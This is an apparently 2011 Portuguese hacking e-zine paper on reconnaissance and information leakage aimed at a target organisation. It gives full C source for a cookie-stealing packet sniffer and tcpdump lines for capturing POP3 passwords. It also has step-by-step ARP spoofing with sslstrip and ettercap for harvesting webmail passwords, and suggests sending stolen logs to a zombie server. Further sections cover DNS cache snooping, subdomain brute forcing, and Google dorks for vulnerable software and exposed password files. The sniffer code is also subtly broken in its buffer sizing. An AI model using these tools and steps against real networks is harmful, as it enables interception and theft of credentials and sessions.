@@ -1,0 +1,1709 @@
+            ____
+        _.-'111 `"`--._
+    ,00010.  .01011,   ''-..
+  ,10101010  `111000. _ ____ ;
+ /_..__..-------- '''    __.'                                                          /
+ `-._       /""| _..-'''     ___  __   __             ___       __      __  .       __'  ___ .  __
+     "`-----\  `\           |    |  | | __ |  | |\/| |___ |    |  |    |__] | |\ | |__| |__/ | |  |
+             |   ;.-""--..  |___ |__| |__] |__| |  | |___ |___ |__|    |__] | | \| |  | |  \ | |__|
+             | ,10.  101. `.========================================--==============================
+             `;1010  `0110  :                       1º Edição
+       .1""-.|`-._          ;
+      010 _.-|    +---+----'
+      `--'\` |    /  /                        ...:::binariae:fungus:::...
+ ~~~~~~~~~| /    |  |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+          \|    /   |
+           `----`---'
+
+Language:Portuguese
+Autor:Antonio Costa "Cooler_"
+Contato:c00f3r[at]gmail[dot]com
+Data: 01/10/11
+ ___        _____         ____                  __
+|   | _____/ ____\____   |    |    ____ _____  |  | __  ______
+|   |/    \   __\/  _ \  |    |  _/ __ \\__  \ |  |/ / /  ___/
+|   |   |  \  | (  |_| ) |    |__\  ___/_/ __ \|    (  \___  \
+|___|___|  /__|  \____/  |_______ \___  |____  /__|_ \/____  /
+         \/                      \/   \/     \/     \/     \/
+
+-Índice
+========
++-----------------------------------------------------+
+| 0x01- Footprint e Fingerprint                       |
+| 0x02- Ataque man-in-the-middle                      |
+| 0x03- Rastreamento de Cache no DNS                  |
+| 0x04- Só um DNS mesmo ?                             |
+| 0x05- O todo poderoso Google                        |
+| 0x06- Como conseguiu esse Documento ?               |
+| 0x07- Cocktail de E-mails                           |
+| 0x08- E-mails e o "The Social-Engineer Toolkit"     |
+| 0x09- Introdução a Automação no Google Hacking      |
+| 0x0a- Agradecimentos                                |
++-----------------------------------------------------+
+ Dica:De um find no número que você quer para ir direto em um tópico exemplo "0x09"
+
+-Introdução
+============
+      ,-~-,       ,-~~~~-,    /\__/\
+(\   / ,-, \    ,'        '. /  ^ ^ \
+ \'-' /   \ \  /     _     )/  <0 0> \
+  '--'     \ \/    .' '.    \ =  Y  =/
+            \     / \   \    )-..!.-'
+             \   \ \ \   `\ \\
+              )  / / /     \ \\        |~~~~~~~~|
+             /  / / /__     \ \\__     | Google |
+            (____)))_)))     \__)))    |________\~~~~~~01010110
+
+  Neste paper vamos abordar um pouco sobre "Info Leak" ou seja
+ vazamento de informações , embora seja um assunto bem falado
+ concluí que seria um assunto fascinante para iniciar  no meu
+ primeiro paper para a e-zine , neste ano 2011, ocorreu muitas
+ noticías intrigantes entorno do wikileaks , estes acontecimentos
+ colaboraram na minha escolha , entretanto estou colocando alguns
+ pontos empíricos para ilustrar. irei mostrar algumas práticas
+ comuns de footprint,fingerprint e diversas formas de pegar
+ informações bem como usar o google,bing seja para fazer download
+ de documentos como currículos ou buscar e-mails,servidores
+ vulneráveis etc...
+
+ Leitores , obrigado pela presença!
+ Obrigado por acreditar!
+ Se poder nos ajude...
+
+ "Um sonho sonhado sozinho é um sonho. Um sonho sonhado junto é realidade."
+                                                                   Por Raul Seixas
+
+-0x01 Footprint e fingerprint
+===============================
+
+-Footprint
+
+   Footprint ou "pegada" uma analogia a técnica forense de seguir
+  pegadas , é a técnica usada para se obter informações sobre um host
+  como nome dos domínios , responsáveis pelos domínios , topologia da rede,
+  tipos de serviços que estão rodando no host , e-mail de funcionários,
+  informações que podem ser útil em um ataque.
+
+  *usando "whois"
+  -Como exemplo como levantar informações de um domínio usamos "whois"
+    whois alvo.com
+   -só por curiosidade caso você goste de programar e queira
+    entender a fundo um whois
+    http://bugsec.googlecode.com/files/whois.c
+
+  *usando "host"
+   -Consultando base DNS:
+     host -l -v -t any alvo.com
+   -procurando servidor de em ail:
+     host -t mx alvo.com
+   -Descobrindo os IPs de servidores DNS:
+     host -t ns alvo.com
+   -olhando o CNAME
+     host -t CNAME alvo.com
+
+  *usando "dig"
+   -informações do registro MX:
+     dig -t mx <empresa>.com.br
+   -informações sobre o registro SOA:
+     dig -t soa <empresa>.com.br
+
+  *usando nslookup
+   -consultar cname
+   nslookup Set type=cname alvo.com
+
+  *usando traceroute para ajudar na topologia da rede,
+   saber se tem roteadores,gateways etc...
+    traceroute -p22 192.168.0.134
+   *ferramenta que pode ajudar é o "cheops-ng"
+    se você estiver dentro da rede.
+
+  *usando netcat para ver banner de um serviço TCP
+    nc alvo.com 21
+    -pelo banner você pode ver versão do software que está rodando e
+     assim procurar um exploit para o mesmo
+
+  *usando nmap para ver o banner também
+    nmap -sV alvo.com -p 21
+
+   Caso queira usar algum script do nmap
+     "http://nmap.org/nsedoc/scripts/banner.html".
+   Lembrando que se for usar bits de controle como fin, syn precisará
+   estar como root já que para o mesmo precisa usar raw sockets.
+
+   Observação quanto aos banners , alguns sysadmins mudam banner botando
+   uma versão diferente da real , ou mesmo usam um honeypot para fazer
+   tal feito...
+
+   No decorrer deste "paper" vamos ilustrar alguns ataques diferentes
+   não sitados como footprint mas estão no mesmo rótulo como "Rastreamento
+   de Cache no DNS".
+
+-FingerPrint
+
+   Logo de cara você já deve ter pensado que estes ataques tem uma
+  analogia a biometria , bom é apenas uma analogia para dizer que cada
+  sistema operacional tem sua marca. vamos ilustrar isso repare que o
+  nmap vai pedir para usar root já que o mesmo vai usar raw sockets.
+
+  Ferramenta mais popular para tal é o nmap , um scaner de portas usados
+  por sysadmin,hackers(whitehats,blackhats...) entre outros para descobrir
+  serviços que estão abertos info do "OS"
+
+  Exemplo simples com nmap;
+
+  nmap -O host
+        |_ argv para saber versão do OS
+
+   nmap -vv -sS -P0 -O localhost
+     sS = usando SYN um bit de controle responsável por sincronismo
+     vv = scan mostrando verbose detalhada
+     P0 = sem ping
+  para ver mais argumentos com nmap ,"nmap --h"
+
+  pode-se usar spoofing também...
+  #nmap -sF -vv -PN -g 53 -n -T 5 -A -D micosoft.com ip_vitima -p portas
+
+    Para evitar isso alguns sistemas operacionais como exemplo o OpenBSD
+  tem uma função no PF(packet filter) para camuflar os Sistemas operacionais
+  em ataques fingerprint semelhante a honeypot no arquivo "/etc/pf.os",
+
+ -http://openbsd.org/faq/pf/filter.html#osfp
+
+    Antigamente no meu "OpenBSD 4.3" eu adicionava no pf.conf
+  seguintes regras
+
+  set fingerprints "/etc/pf.os"
+  block drop in quick on eth0 from any os { NMAP }
+
+    Então quando o atacante mandava fingerprint achava que estava
+  rodando no host do alvo um CISCO,HP-UX algum host do arquivo "pf.os".
+  Bom para ludibriar mas alguns ataques otimizados com FIN , SYN com
+  tempo diferente do default do "nmap" pode mudar os resultados podendo
+  ai chegar no resultado do tipo de OS.
+
+  Só umas palavrinhas quanto ao PF , meio que utópico mas vou falar ,
+  andam por ai dizendo que o PF não segura rojão e  como gateway
+  deixa na mão é lento etc... , Bom você usa "scrub all" , "antispoof"
+  claro que vai ficar lento ele normaliza e analisa tudo o que passa
+  por ele... se quer desempenho use só o "block all" depois vá dando
+  "pass".
+
+  Voltando ao tópico caso queira tentar fazer seu port Scan sugiro
+  que veja minha ferramenta o "hyde" está certo que só manda send()
+  com raw mas pode ser útil para estudo
+  https://github.com/CoolerVoid/C/blob/master/hyde3.c
+
+  última dica do tópico o paper "The Art of Port Scanning" do fyodor
+   http://www.phrack.org/issues.html?issue=51&id=11#article
+
+  lembrando que o nmap anda sendo muito usado em conjunto com metasploit
+  vide o "fast track" do secmaniac "www.secmaniac.com"
+
+ *ferramentas que você deve conhecer
+  http://lcamtuf.coredump.cx/soft/p0f.tgz
+  http://lcamtuf.coredump.cx/soft/fl0p-devel.tgz
+  http://lcamtuf.coredump.cx/soft/0trace.tgz
+
+ Referência:
+ http://insecure.org
+ http://www.openbsd.org
+
+-0x02 Ataque man-in-the-middle
+===============================
+
+   Interceptação de dados é uma das técnicas que não poderia faltar
+ neste paper , já que o mesmo trata de vazamento de informações.
+
+ *Bom vamos ao básico primeiro
+
+  ferramenta simples e que gosto muito é o "tcpdump", da para fazer o
+ mesmo usando outras ferramentas como wireshark , ettercap , dsnif. fica
+ a seu gosto.
+
+ http://www.tcpdump.org/
+
+ Exemplo:
+
+---------------------------------
+
+ $ tcpdump -i eth0 -n tcp port 110 -A
+ *assim podemos pegar senhas do POP3
+
+ $ tcpdump -i eth0 -n tcp port 80 -A | grep Cookie
+ *assim temos uma visão dos Cookies que passam no protocolo HTTP
+
+ $ man tcpdump
+
+ #milhares de outros tipos de ataques...
+---------------------------------
+
+  Obter acesso remoto a um server, deixar
+ além de um backdoor um snifer para minar senhas
+ e tudo mais. por exemplo...
+
+ *Otimizando o Ataque
+ ------------------------
+
+    Vou passar um exemplo , lembrando que com coisas simples são a raiz
+  para resolver problemas complicados , Baseado nos exemplos da "libpcap"
+  se fosse fazer usando "raw sock" iria dar um trabalho maior e não seria
+  portável e poderia tirar o foco aqui.
+
+  Continuando a ideia do roubo de Cookies do exemplo anterior
+
+---------------------------------
+/*
+Simple Cookie Eater v0.1
+*what is this ?
+-so this is Simple Cookie stealer
+-Just Another Snifer to find cookies
+
+*follow my example to run:
+  root# gcc -o code code.c -lpcap; ./code eth0 1000 log.txt
+ the 1000 is number of packets to carry
+
+ is held by GPL
+ Based on tcpdump examples
+
+Author: Cooler_
+E-mail: c00f3r[at]gmail[dot]com
+date: 02/08/2011
+BugSec Security TEAM
+http://code.google.com/p/bugsec/
+thanks: m0nad,_mlk_,IAK,sigsegv,delfo,c0lt7r,joey,fokerbug,
+zepplin,otacon,backbone,nibbles,voidpointer,muzgo,memset,novato_br
+*/
+#include <pcap.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+// Colors Macros
+#define WHITE1 "[0m"
+#define GRAY "[1;30m"
+#define RED "[1;31m"
+#define GREEN "[1;32m"
+#define BLUE "[1;34m"
+
+/* default snap length (maximum bytes per packet to capture) */
+#define SNAP_LEN 1518
+
+/* ethernet headers are always exactly 14 bytes [1] */
+#define SIZE_ETHERNET 14
+
+/* Ethernet addresses are 6 bytes */
+#define ETHER_ADDR_LEN	6
+
+/* Ethernet header */
+struct sniff_ethernet {
+ u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
+ u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
+ u_short ether_type;                     /* IP? ARP? RARP? etc */
+};
+
+// baseado no exemplo de snifer da libpcap
+/* IP header */
+struct sniff_ip {
+ u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
+ u_char  ip_tos;                 /* type of service */
+ u_short ip_len;                 /* total length */
+ u_short ip_id;                  /* identification */
+ u_short ip_off;                 /* fragment offset field */
+#define IP_RF 0x8000            /* reserved fragment flag */
+#define IP_DF 0x4000            /* dont fragment flag */
+#define IP_MF 0x2000            /* more fragments flag */
+#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
+ u_char  ip_ttl;                 /* time to live */
+ u_char  ip_p;                   /* protocol */
+ u_short ip_sum;                 /* checksum */
+ struct  in_addr ip_src,ip_dst;  /* source and dest address */
+};
+#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
+#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
+
+/* TCP header */
+typedef u_int tcp_seq;
+
+struct sniff_tcp {
+  u_short th_sport;               /* source port */
+  u_short th_dport;               /* destination port */
+  tcp_seq th_seq;                 /* sequence number */
+  tcp_seq th_ack;                 /* acknowledgement number */
+  u_char  th_offx2;               /* data offset, rsvd */
+#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
+  u_char  th_flags;
+#define TH_FIN  0x01
+#define TH_SYN  0x02
+#define TH_RST  0x04
+#define TH_PUSH 0x08
+#define TH_ACK  0x10
+#define TH_URG  0x20
+#define TH_ECE  0x40
+#define TH_CWR  0x80
+#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
+  u_short th_win;                 /* window */
+  u_short th_sum;                 /* checksum */
+  u_short th_urp;                 /* urgent pointer */
+};
+
+static char *FileName;
+
+void
+Logo()
+{
+ int c=0;
+ char *banner[] = {
+  "(COOKIE)",
+  "w  c(..)o  (",
+  " \\__(-)   )",
+  "     /\\  (  ",
+  "    / ()__) ",
+  "   w  /|",
+  "     | \\",
+  "     m  m",
+  "Cooler's Simple Cookie Eater v0.1",
+ };
+ while(c^8)
+  puts(banner[c]),c++;
+}
+
+void
+Usage()
+{
+ puts("Simple Cookie Eater v0.1\n follow the example");
+ puts("./code eth0 Number_of_packets2get log.txt");
+}
+
+void
+WriteFile(char *file,char *str)
+{
+ FILE *arq;
+
+ arq=fopen(file,"a");
+  if(!arq)
+   puts("error to write log file");
+ fprintf(arq,"%s\n",str);
+ fclose(arq);
+}
+
+void
+TookPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+{
+ static int count = 1;
+ const struct sniff_ethernet *ethernet;
+ const struct sniff_ip *ip;
+ const struct sniff_tcp *tcp;
+ const char *payload;
+ char *FileWord;
+ int size_ip,size_tcp,size_payload;
+
+ fprintf(stdout,"\nPacket number %d:\n", count);
+ count++;
+
+ ethernet=(struct sniff_ethernet*)(packet);
+ ip=(struct sniff_ip*)(packet + SIZE_ETHERNET);
+ size_ip=IP_HL(ip)*4;
+ if(size_ip<20)
+ {
+  fprintf(stdout,"* Invalid IP header length: %u bytes\n", size_ip);
+  return;
+ }
+
+ fprintf(stdout,"From: %s\n", inet_ntoa(ip->ip_src));
+ fprintf(stdout,"To: %s\n", inet_ntoa(ip->ip_dst));
+
+ switch(ip->ip_p)
+ {
+  case IPPROTO_TCP:
+   puts("Protocol: TCP\n");
+   break;
+  case IPPROTO_IP:
+   puts("Protocol: IP\n");
+   return;
+  default:
+   puts("Protocol: unknown\n");
+   return;
+ }
+
+ tcp=(struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+ size_tcp=TH_OFF(tcp)*4;
+
+ if(size_tcp < 10)
+ {
+  fprintf(stdout,"* Invalid TCP header length: %u bytes\n", size_tcp);
+  return;
+ }
+
+ fprintf(stdout,"Src port: %d\n", ntohs(tcp->th_sport));
+ fprintf(stdout,"Dst port: %d\n", ntohs(tcp->th_dport));
+
+ payload=(char *)(packet+SIZE_ETHERNET+size_ip+size_tcp);
+ size_payload=ntohs(ip->ip_len)-(size_ip+size_tcp);
+
+ FileWord=malloc(sizeof(char *)*size_payload);
+
+ if(size_payload!=0)
+ {
+  fprintf(stdout,"   Payload (%d bytes):\n", size_payload);
+  fprintf(stdout,"Look Payload:\n%s\n",payload);
+// esta parte é bom customizar ao seu gosto :-)
+// aqui nosso filtro , se no ascii tem "Cookie" então pegamos :-)
+  if(strstr(payload,"Cookie:"))
+  {
+   fprintf(stdout,"\n%s cookies:is:here %s \n",RED,WHITE1);
+   snprintf(FileWord,sizeof(FileWord),"From: %s\nCookie: %s\n\n",inet_ntoa(ip->ip_src),payload);
+   WriteFile(FileName,FileWord);
+  }
+ }
+ free(FileWord);
+}
+
+int main(int argc, char **argv)
+{
+ char *dev = NULL;
+ char errbuf[PCAP_ERRBUF_SIZE];
+ char filter_exp[] = "ip";
+
+ pcap_t *handle;
+ struct bpf_program fp;
+ bpf_u_int32 mask;
+ bpf_u_int32 net;
+
+ int num_packets = 0;
+
+ Logo();
+
+ if(argc==4)
+ {
+  dev=argv[1];
+  num_packets=atoi(argv[2]);
+  FileName=argv[3];
+ }
+ else if(argc > 3)
+ {
+  fprintf(stderr, "error: unrecognized command-line options\n\n");
+  Usage();
+  exit(EXIT_FAILURE);
+ }
+ else {
+  dev=pcap_lookupdev(errbuf);
+  if(dev == NULL)
+  {
+   fprintf(stderr, "Couldn't find default device: %s\n",
+   errbuf);
+   exit(EXIT_FAILURE);
+  }
+ }
+
+ if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
+ {
+  fprintf(stderr, "Couldn't get netmask for device %s: %s\n",dev, errbuf);
+  net=0;
+  mask=0;
+ }
+
+ fprintf(stdout,"Device: %s\n", dev);
+ fprintf(stdout,"Number of packets: %d\n", num_packets);
+ fprintf(stdout,"Filter expression: %s\n", filter_exp);
+
+// abrindo dispositivo de captura
+ handle=pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
+ if(handle == NULL)
+ {
+  fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+  exit(EXIT_FAILURE);
+ }
+
+ if(pcap_datalink(handle) != DLT_EN10MB)
+ {
+  fprintf(stderr, "%s is not an Ethernet\n", dev);
+  exit(EXIT_FAILURE);
+ }
+
+ if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
+ {
+  fprintf(stderr, "Couldn't parse filter %s: %s\n",
+  filter_exp, pcap_geterr(handle));
+  exit(EXIT_FAILURE);
+ }
+
+ if(pcap_setfilter(handle, &fp) == -1)
+ {
+  fprintf(stderr, "Couldn't install filter %s: %s\n",
+  filter_exp, pcap_geterr(handle));
+  exit(EXIT_FAILURE);
+ }
+
+ pcap_loop(handle, num_packets, TookPacket, NULL);
+
+// free pcap
+ pcap_freecode(&fp);
+ pcap_close(handle);
+
+ puts("End Look the logs file");
+ puts(FileName);
+
+return 0;
+}
+---------------------------------
+
+    Esse código é simples  baseado nos exemplos da "libpcap",
+ parece ser algo bobo , mas imagine as possibilidades usar um exec() ,
+ system() em "mail" para enviar os logs para seu e-mail,ou mesmo fazer
+ um POST ou GET para mandar informações para um código PHP em um servidor
+ Zumbi...
+
+ *E se encontrar SSL ?
+
+  Em 2009 na conferencia Black Hat DC um hacker aka "moxie0" mostrou
+ uma técnica de roubar dados de HTTPS redirecionando para HTTP, o programa
+ para fazer isso pode ser usado em conjunto com "dsnif" , "ettercap",
+ "wireshark". Olhando o "github" do seu projeto "SSLstrip" você pode
+ entender os detalhes de desenvolvimento caso saiba python.
+
+   https://github.com/moxie0/sslstrip
+
+  Pessoalmente tinha ouvido falar muito bem do twisted , mas não imaginava
+ ser algo tão poderoso,analisando aqui descobri que se pode fazer um http
+ proxy server em poucas linhas "http://wiki.python.org/moin/Twisted-Examples".
+ Código em "SSLServerConnection.py" da para ver que o autor faz os parsers
+ todos manualmente usando regex , deixando no ar a dúvida se python não tem
+ módulo que faça isso.
+
+ Exemplo de uso:
+
+ -instalando requesitos;
+   apt-get install python python-twisted-web dsniff ettercap
+
+ -baixe o programa
+   https://github.com/moxie0/sslstrip
+ -instale
+   sudo python ./setup.py install
+
+ -ative modo de redirecionamento
+   echo "1" > /proc/sys/net/ipv4/ip_forward
+
+ -redirecione porta 80 para uma porta qualquer
+   iptables -t nat -A PREROUTING -p tcp --destination-port 80
+    -j REDIRECT --to-port 1337
+
+ -usamos sslstrip na porta que foi redirecionada
+   sslstrip.py -l 1337
+
+ -fazemos ataque arp spoofing
+   arpspoof -i eth0 -t IpAlvo GatewayDoIP
+ *caso quer saber o seu gateway
+  " ip route show | grep default | awk '{ print $3}' "
+ *caso queira saber os IPs dos PCs que tem na rede use o "cheops-ng"
+   ou faça uma varredura
+  com nmap...
+ *O que é ARP Spoofing ?
+  ARP-Poisoning,ArpSpoofing é ataque no qual uma falsa resposta ARP
+  é enviada à uma requisição ARP original assim o host alvo manda
+  informações para quem enviou a falsa resposta.
+
+ -então ettercap
+   sudo ettercap -Tqz
+
+ -agora só esperar senhas de gmail,yahoo etc, no terminal onde foi
+  executado o ettercap.
+
+ *para se pensar
+  -E se invés de usar ettercap usar nosso "cookie eater" ou algum
+   snifer otimizado por você ?
+  -E se você quebrar uma WEP e estiver numa rede que não conhece ?
+  -E se você deixar sua wifi aberta e snifar quem entrar ?
+
+referências:
+ http://www.tcpdump.org/pcap.html
+ https://github.com/moxie0/sslstrip
+
+-0x03 Rastreamento de Cache no DNS
+======================================
+
+   Com a cache de um DNS podemos saber que DNS a empresa alvo acessa,
+ em palavras mais comuns , imagine se o servidor alvo for ponte para uma
+ intranet para os funcionarios ter acesso a internet , você vai poder ver
+ em que site os funcionarios visitaram , parece ser médiocre mas olhe o
+ que você pode saber.
+
+ *Site que a empresa usa para comprar ações
+ *De que distribuidores a empresa alvo compra
+ *DNS de um UPDATE de algum software
+ *Qual site mais visitado por Funcionarios
+ *Que Banco é usado pela empresa
+ *DNS de algum Gateway de pagamento se usa alguma máquina da Cielo...
+ *DNS para POP3 mais usado pela empresa exemplo: gmail,yahoo,hotmail...
+
+ Como o Fazer ?
+ ---------------
+ vamos usar o comando "dig" para testar o DNS
+                                                       /-ataque não recursivo
+                                                       |
+   $ dig vodkaNostra.com cogumelobinario.hashit.org A +norecurse
+               |                   |
+              alvo        ver se já visitou esta URL
+
+ Bom analisando o OUT do "dig"
+
+ se encontrar  "ANSWER: 0..." significa que o DNS provavelmente não foi
+ visitado pelo alvo
+
+ se encontrar "ANSWER: [0-9]+" significa que alguém já solicitou este
+ serviço por la pode ser solicitado a TTL time para saber quando foi
+ visitado...
+
+ *norecurse diz que o ataque não vai ser recursivo,se for vai acabar
+  deixando rastro não é uma boa ideia...
+
+ Automatizando
+ --------------
+
+  Fazer manualmente ir chutando DNS para descobrir é uma tarefa
+ chata , Você pode fazer um programa para dar um system() com "dig"
+ depois usa strstr() para achar o "ANSWER: 0", usar uma lista de URLs,
+ ou mesmo fazer seu próprio dig com socket() conectando na porta 53.
+ Daria trabalho mesmo por que já existe a roda , vamos ver um script
+ para o nmap.
+
+ http://nmap.org/nsedoc/scripts/dns-cache-snoop.html
+
+ EXEMPLO:
+ ----------
+ nmap -sU -p 53 --script dns-cache-snoop.nse \
+ --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={host1,host2,host3}'\
+ vodkaNostra.com
+
+ PORT   STATE SERVICE REASON
+ 53/udp open  domain  udp-response
+ | dns-cache-snoop: 8 of 213 tested domains are cached.
+ | www.google.com
+ | facebook.com
+ | www.youporn.com
+ | xvideos.com
+ | itau.com.br
+ | www.microsoft.com
+ | ambev.com.br
+ |_www.cielo.com.br
+
+ Dica, no vetor "ALEXA_DOMAINS" bote mais dominios de prefêrencia
+ da região do host...
+
+ Outro Script fascinante que pode ajudar:
+  http://misc-security.com/blog/2009/10/interrogating-dns-caches-cache-snoop/
+
+-0x04 Só um DNS mesmo ?
+========================
+
+   Muitos já chegam focados em um só servidor atacando com autopwn,
+ chegam a desistir se não achar nada , mas na verdade á sempre outros
+ servidores alternativos não só para WEB mas com  serviços diversos
+ como de POP3 , SMTP ou mesmo um FTP"hehe aquele ProFTPd com versão
+ deprecated",serviço sempre é colírio para os olhos do atacande pois
+ vendo o banner ele pode ter um pseudo  julgamento se a versão está
+ desatualizada"cof cof o sysadmin pode alterar o banner", logo procurar
+ na Internet um possível exploit para explorar...
+
+ Todo dado obtido é útil e ainda mas um que almenta a tabela de
+ probabilidades de sucesso em um ataque, para a descoberta de possíveis
+ hosts do alvo podemos usar o "DNS-discovery" ferramenta do meu amigo
+ "m0nad". Na minha opinião a melhor ferramenta para tal feito...
+
+  DOWNLOAD em http://code.google.com/p/dns-discovery/
+              https://github.com/m0nad/DNS-Discovery/
+
+compilamos:
+ $ gcc -o dns-discovery dns-discovery.c -Wall -Wextra -lpthread -O3
+
+ $ ./dns-discovery
+   ___  _  ______    ___  _
+  / _ \/ |/ / __/___/ _ \(_)__ _______ _  _____ ______ __
+ / // /    /\ \/___/ // / (_-</ __/ _ \ |/ / -_) __/ // /
+/____/_/|_/___/   /____/_/___/\__/\___/___/\__/_/  \_, /
+                                                  /___/
+	by m0nad
+
+usage: ./dns-discovery <domain> [options]
+options:
+	-w <wordlist file> (default : wordlist.wl)
+	-t <threads> (default : 1)
+	-r <report file>
+	-c <csv report file>
+
+executamos:
+ $ ./dns-discovery bola8.com.br -w wordlist.wl -t 5 -r log.txt
+
+resultado:
+   ___  _  ______    ___  _
+  / _ \/ |/ / __/___/ _ \(_)__ _______ _  _____ ______ __
+ / // /    /\ \/___/ // / (_-</ __/ _ \ |/ / -_) __/ // /
+/____/_/|_/___/   /____/_/___/\__/\___/___/\__/_/  \_, /
+                                                  /___/
+	by m0nad
+
+DOMAIN: bola8.com.br
+THREADS: 5
+REPORT: log.txt
+WORDLIST: wordlist.wl
+
+mail.bola8.com.br
+IPv4 address: 123.123.123.76
+IPv4 address: 123.123.123.72
+
+mysql.bola8.com.br
+IPv4 address: 123.123.123.1
+IPv4 address: 123.123.123.2
+
+smtp.bola8.com.br
+IPv4 address: 123.123.123.12
+IPv4 address: 123.123.123.11
+...
+
+ lógica desse programa gira em torno da função getaddinfo(),meio que
+ um Fuzzing de DNS...
+
+ enfim mais alvos para investigar !!!
+
+-0x05 O todo poderoso Google
+=============================
+
+  Durante anos Google tem sido uma fonte rica de busca de informação,
+ sem ele obviamente você nem estaria aqui , muitos acham que sabem tudo
+ do Google , mas não é por ai o caminho o assunto por volta dele é bem
+ mais complexo ,  tem um livro Best seller chamado "Google Hacking" do
+ Johnny Long que vale ser lido. Bom Google é o pai do "Info Leak" ,
+ vamos saber o por que.
+
+ Vamos entendender alguns Operadores mais comuns,para você possa criar
+ suas buscas
+
+  site: = restringe a busca num unico dominio
+  allinurl: = mostra somente urls que contenham certa palavra
+  inurl: = mostra sites que contenha na URL certa palavra
+  allintitle: = mostra somente sites com titulo especifico
+  intitle: = Procura sites com um titulo especifico
+  filetype: = procura urls com um documento especifico
+              exemplo "filetype: pdf|chm"
+
+ -Um guia mais completo dos operadores
+  http://www.googleguide.com/advanced_operators_reference.html
+
+ *Na prática
+
+ Por exemplo, você quer procurar um servidor de Proxy então procuramos por:
+  inurl:"nph-proxy.cgi" "start using cgiproxy"
+  resultado de cara um servidor de proxy
+  "http://www.stayincognito.com/nph-proxy.cgi"
+
+ Você quer achar musicas do "offspring":
+  intitle:"index of" offspring to intitle:"index of" (mp3|mp4|avi) offspring
+
+ Livros em pdf ou chm
+  rene+descartes+discurso filetype: pdf|chm
+
+ Cameras ao vivo
+  inurl/view/index.shtml
+  intitle:":Live View /-Axis" | inurl:view/view.shtml^
+
+ Cameras de Segurança
+  inurl:"viewerframe?mode=motion"
+  intitle:"Live View / - AXIS"
+
+ * Procurando por algum software vulnerável , as famosas "dork"
+
+ SAP
+  inurl:/sap/bc/bsp
+  inurl:/irj/portal
+  inurl:/scripts/wgate
+  inurl:/scripts/wgate/webgui
+  inurl:infoviewapp
+
+ Wordpress
+  inurl:wp-shopping-cart.php
+  inurl:regevent_action=register&event_id
+  inurl:a-to-z-category-listing/
+  inurl:paid-downloads/download.php?download_key=
+  inurl:eventify/php/ajax/fetcheventdetails.php
+  inurl:wordpress-donation-plugin-with-goals-and-paypal-ipn-by-nonprofitcmsorg/exporttocsv.php
+
+ Joomla
+   Simple File Lister v1.0
+   inurl:/component/option,com_jdirectory
+   inurl:index.php?option=com_virtuemart
+   inurl:com_team
+   com_joomnik
+   inurl:index.php?option=com_jmsfileseller
+
+ Sistemas com Jboss
+  allinurl:HtmlAdaptor MBean
+  allinurl:/jmx-console
+  allinurl:admin-console/login.seam
+  title:JMX Management Console
+  title:JBoss AS Admin Console
+  title:JBoss AS Administration Console
+
+ Encontrar códigos com falha de disclosure
+  site:info filetype:inc~
+  site:info filetype:cfg~
+  site:info filetype:config~
+  site:info filetype:cgi~
+  site:info filetype:asp~
+  site:info filetype:jsp~
+  site:info filetype:rb~
+  site:info filetype:py~
+  site:info filetype:php~
+  filetype:inc intext:mysql_connect
+ *códigos em php com a função mysql_connect() geralmente tem login e
+  senha do DB pode-se procurar por funções que usam PDO pro exemplo etc...
+
+ Senhas
+  http://*:*@
+  intitle:"Index of" passwords modified
+  allinurl:auth_user_file.txt
+  allinurl:pass.txt
+
+ Tem uma infinidade de dicas no site do Johnny Long
+ "http://johnny.ihackstuff.com/ghdb/"
+
+-0x06 Como conseguiu esse Documento ?
+======================================
+
+   Muitos dos documentos expostos em Hosts não eram para estar
+ expostos como currículos de funcionarios , com um currículo de
+ um funcionario você pode saber com que a empresa trabalhou por
+ exemplo você vê que em 2 currículos de empregados diferentes
+ ambos tem LDAP e habilidades com Oracle 10g por ai o atacante
+ pode planejar mais coisas. Fora que o atacante pode se passar
+ por um funcionario...
+
+ vamos a prática...
+
+ Programa que vamos usar é o Metagoofil
+ DOWNLOAD - http://code.google.com/p/metagoofil/
+
+ É feito em Python , a lógica dele é diferente de como sitei de
+ pegar todas as URL , o programa usa o Google para fazer busca
+ dos documentos no site , exemplo ele da a dork
+ "site:empresa.com filetype: pdf"
+ logo o google ne retorna os documentos em "pdf" do site então
+ o programa da "parser" nas url , solução genial !
+
+Forma de usar é simples:
+
+ $ python ./metagoofil.py -d empresa.com -l 100 -t pdf,doc -o resultado -f resultado.html
+
+Mais info:
+
+ $ python metagoofil.py
+
+ *************************************
+ *MetaGooFil Ver. 1.4b 		     *
+ *Coded by Christian Martorella      *
+ *Edge-Security Research             *
+ *cmartorella@edge-security.com      *
+ *************************************
+
+ MetaGooFil 1.4
+
+ usage: metagoofil options
+
+	-d: domain to search
+ 	-f: filetype to download (all,pdf,doc,xls,ppt,odp,ods, etc)
+	-l: limit of results to work with (default 100)
+	-o: output file, html format.
+	-t: target directory to download files.
+
+	Example: metagoofil.py -d microsoft.com -l 20 -f all -o micro.html -t micro-files
+
+----------------------------------
+ E se tiver exposto documentos de maior sigilo ?
+ Muitos dos documentos do Wikileaks não foi necessário
+ nem exploração para obter, pense nisso...
+
+-0x07 Cocktail de E-mails
+===========================
+
+   Uma das práticas mais comuns dos "engenheiros sociais" é
+ pegar o máximo de e-mails de funcionarios da empresa alvo.Com
+ isso eles podem abrir um léque de possíbilidade de ataques
+ seja roubo de cookies , controle remoto...
+
